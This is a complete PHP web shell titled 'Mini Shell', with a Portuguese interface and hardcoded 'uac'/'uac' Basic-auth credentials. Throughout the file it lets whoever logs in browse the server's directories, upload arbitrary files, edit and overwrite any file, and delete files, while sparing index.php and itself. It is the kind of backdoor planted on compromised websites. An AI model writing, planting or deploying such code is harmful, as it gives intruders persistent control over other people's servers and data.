<?php
$valid_user = 'uac';
$valid_pass = 'uac';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) ||
    $_SERVER['PHP_AUTH_USER'] !== $valid_user || $_SERVER['PHP_AUTH_PW'] !== $valid_pass) {
    header('WWW-Authenticate: Basic realm="Shell Protegido"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Acesso negado.';
    exit;
}

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($path);
if (!$path || !is_dir($path)) {
    $path = getcwd();
}

$self = basename(__FILE__);
$preservados = ['index.php', $self];

if (isset($_GET['delete'])) {
    $file = basename($_GET['delete']);
    $filePath = realpath($path . DIRECTORY_SEPARATOR . $file);
    if ($filePath && is_file($filePath) && strpos($filePath, $path) === 0 && !in_array($file, $preservados)) {
        unlink($filePath);
        echo "<div class='alert'>🗑️ Arquivo '$file' apagado!</div>";
    }
}

if (isset($_POST['delete_selected']) && isset($_POST['files'])) {
    foreach ($_POST['files'] as $file) {
        $file = basename($file);
        $filePath = realpath($path . DIRECTORY_SEPARATOR . $file);
        if ($filePath && is_file($filePath) && !in_array($file, $preservados)) {
            unlink($filePath);
        }
    }
    echo "<div class='alert'>🗑️ Arquivos selecionados apagados!</div>";
}

if (isset($_FILES['newfile'])) {
    $uploadPath = $path . DIRECTORY_SEPARATOR . basename($_FILES['newfile']['name']);
    if (move_uploaded_file($_FILES['newfile']['tmp_name'], $uploadPath)) {
        echo "<div class='alert'>📤 Arquivo enviado com sucesso!</div>";
    } else {
        echo "<div class='alert error'>Erro no envio do arquivo.</div>";
    }
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function editFile($path, $file) {
    $filePath = realpath($path . DIRECTORY_SEPARATOR . $file);
    if (!$filePath || !is_file($filePath)) {
        echo "<div class='alert error'>Arquivo inválido.</div>";
        return;
    }

    if (isset($_POST['content'])) {
        file_put_contents($filePath, $_POST['content']);
        echo "<div class='alert'>💾 Salvo com sucesso!</div>";
    }

    $content = htmlspecialchars(file_get_contents($filePath));
    echo "<h2>📝 Editando: $file</h2>";
    echo "<form method='POST'>
        <textarea name='content'>$content</textarea><br>
        <button type='submit'>Salvar</button>
    </form>";
}

function listDir($path, $preservados) {
    $items = scandir($path);
    echo "<h2>📁 Diretório atual</h2>";
    echo "<div class='path'>$path</div>";

    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $link = '';
    echo "<div class='breadcrumbs'>Navegar: ";
    foreach ($parts as $part) {
        if ($part == '') continue;
        $link .= DIRECTORY_SEPARATOR . $part;
        echo "<a href='?path=$link'>$part</a>/";
    }
    echo "</div>";

    echo "<form method='POST' enctype='multipart/form-data' class='upload-form'>
        <input type='file' name='newfile' required>
        <button type='submit'>📤 Enviar arquivo</button>
    </form>";

    echo "<form method='POST' onsubmit='return confirm(\"Apagar arquivos selecionados?\")'>";
    echo "<table class='fade-in'><tr><th></th><th>Nome</th><th>Tamanho</th><th>Modificado</th><th>Ações</th></tr>";
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $itemPath = realpath($path . DIRECTORY_SEPARATOR . $item);
        $isDir = is_dir($itemPath);
        $size = $isDir ? '-' : formatSize(filesize($itemPath));
        $modified = date('d/m/Y H:i:s', filemtime($itemPath));

        echo "<tr>";
        echo "<td>";
        if (!$isDir && !in_array($item, $preservados)) {
            echo "<input type='checkbox' name='files[]' value='" . htmlspecialchars($item) . "'>";
        }
        echo "</td>";
        echo "<td>$item</td>";
        echo "<td>$size</td>";
        echo "<td>$modified</td>";
        echo "<td>";
        if ($isDir) {
            echo "<a class='btn' href='?path=$itemPath'>📂 Abrir</a>";
        } else {
            echo "<a class='btn' href='?path=$path&edit=$item'>📝 Editar</a> ";
            if (!in_array($item, $preservados)) {
                echo "<a class='btn danger' href='?path=$path&delete=$item' onclick='return confirm(\"Apagar $item?\")'>🗑️ Apagar</a>";
            }
        }
        echo "</td></tr>";
    }
    echo "</table><br>";
    echo "<button type='submit' name='delete_selected'>🧹 Apagar selecionados</button>";
    echo "</form>";
}

echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Mini Shell</title>";
echo "<style>
    body { font-family: 'Segoe UI', sans-serif; background: #121212; color: #e0e0e0; padding: 30px; animation: fadein 0.5s; }
    h2 { margin-top: 0; color: #fff; }
    .path { font-size: 14px; color: #aaa; margin-bottom: 10px; }
    .breadcrumbs a { text-decoration: none; color: #66aaff; }
    .breadcrumbs a:hover { text-decoration: underline; }
    table { width: 100%; border-collapse: collapse; background: #1e1e1e; box-shadow: 0 2px 5px rgba(0,0,0,0.3); margin-top: 15px; }
    th, td { padding: 10px 15px; border-bottom: 1px solid #333; }
    th { background: #2a2a2a; color: #ccc; }
    .btn { padding: 5px 10px; background: #2980b9; color: white; text-decoration: none; border-radius: 4px; margin-right: 5px; display: inline-block; transition: all 0.2s ease; }
    .btn:hover { background: #3498db; transform: scale(1.05); }
    .btn.danger { background: #c0392b; }
    .btn.danger:hover { background: #e74c3c; }
    textarea { width: 100%; height: 400px; font-family: monospace; font-size: 14px; padding: 10px; background: #1e1e1e; color: #eee; border: 1px solid #444; }
    button { padding: 10px 20px; background: #27ae60; border: none; color: white; border-radius: 4px; cursor: pointer; transition: background 0.3s; }
    button:hover { background: #2ecc71; }
    .alert { background: #2d4f2d; color: #c3f7c3; padding: 10px; margin-bottom: 15px; border-left: 5px solid #27ae60; animation: fadein 0.5s; }
    .alert.error { background: #4f2d2d; color: #f7c3c3; border-left-color: #c0392b; }
    .upload-form { margin-bottom: 20px; }
    @keyframes fadein { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    .fade-in { animation: fadein 0.5s ease-in-out; }
</style>";
echo "</head><body>";

if (isset($_GET['edit'])) {
    editFile($path, $_GET['edit']);
} else {
    listDir($path, $preservados);
}

echo "</body></html>";
?>
